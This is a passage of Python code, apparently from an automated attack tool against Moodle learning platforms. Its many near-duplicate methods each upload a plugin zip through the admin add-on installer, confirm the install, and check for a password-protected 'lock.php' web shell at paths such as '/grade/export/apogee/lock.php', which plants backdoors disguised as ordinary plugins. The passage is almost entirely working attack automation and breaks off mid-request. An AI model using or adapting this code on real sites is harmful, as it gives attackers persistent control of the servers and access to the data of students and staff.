            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/grade/report/rubrics/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellGradeExport(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-gradeexport_apogee-MOODLE_400_STABLE.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/grade/export/apogee/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellReports(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-report_coursecompletion-main.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/report/coursecompletion/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellProfileField(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-profilefield_associated-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/user/profile/field/associated/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellDataFormat(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-dataformat_xml-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/dataformat/xml/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellMediaPlayer(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-media_realplayer-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/media/player/realplayer/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellMessageOutput(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-message_output_telegram-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/message/output/telegram/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellCustomField(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-customfield_file-main_39.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/customfield/field/file/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellCalendarType(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-calendartype_ummulqora-master.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/calendar/type/ummulqora/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellAvailability(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-availability_language-main.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                'sesskey': sesKey,
                '_qf__tool_installaddon_installfromzip_form': '1',
                'mform_showmore_id_general': '0',
                'mform_isexpanded_id_general': '1',
                'zipfile': f'{zipfileid}',
                'plugintype': '',
                'rootdir': '',
                'submitbutton': submitButton,
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)

            req = self.session.get(req.headers["Location"], headers=self.headers, verify=False, timeout=self.timeout).text
            zipcomponent = re.findall(r'name="installzipcomponent" value="(.*?)"', req)[0]
            installzipstorage = re.findall(r'name="installzipstorage" value="(.*?)"', req)[0]
            sesKey = re.findall(r'name="sesskey" value="(.*?)"', req)[0]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
                "installzipcomponent": zipcomponent,
                "installzipstorage": installzipstorage,
                "installzipconfirm": "1",
                "sesskey": sesKey
            }, allow_redirects=False, headers=self.headers, verify=False, timeout=self.timeout)
            
            if self.CheckShell(self.url.replace("/login/index.php", "") + "/availability/condition/language/lock.php", 'type="password" name="password"'):
                return True
            else:
                return False
        except:
            return False
    
    def UploadShellAuth(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            client_id = re.findall(r'"client_id":"(.*?)"', req)[0]
            itemId = re.findall(r'"itemid":(.*?),', req)[0]
            maxbytes = re.findall(r'"maxbytes":(.*?),', req)[0]
            ctx_id = re.findall(r'ctx_id=(.*?)&', req)[0]
            sesKey = re.findall(r'"sesskey":"(.*?)"', req)[0]
            repo_id = re.findall(r'"recentrepository":"(.*?)"', req)[0]
            author = re.findall(r'"author":"(.*?)"', req)[0]
            licenses = re.findall(r'"defaultlicense":"(.*?)"', req)[0]
            submitButton = re.findall(r'id="id_submitbutton"\s*value="(.*?)"', req, re.DOTALL)[0]
            files = {'repo_upload_file': open("moodle-auth_userkey-MOODLE_33PLUS.zip", "rb")}
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=list", data={
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": maxbytes,
                "areamaxbytes": "-1",
                "ctx_id": ctx_id
            }, headers=self.headers, verify=False, timeout=self.timeout)
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/repository/repository_ajax.php?action=upload", data={
                "title": "",
                "author": author,
                "license": licenses,
                "itemid": itemId,
                "accepted_types[]": ".zip",
                "repo_id": repo_id,
                "p": "",
                "page": "",
                "env": "filepicker",
                "accepted_types[]": ".zip",
                "sesskey": sesKey,
                "client_id": client_id,
                "itemid": itemId,
                "maxbytes": "-1",
                "areamaxbytes": "-1",
                "ctx_id": ctx_id,
                "savepath": "/"
            }, files=files, headers=self.headers, verify=False, timeout=self.timeout)
            zipfileid = req.json()["id"]
            
            req = self.session.post(self.url.replace("/login/index.php", "") + "/admin/tool/installaddon/index.php", data={
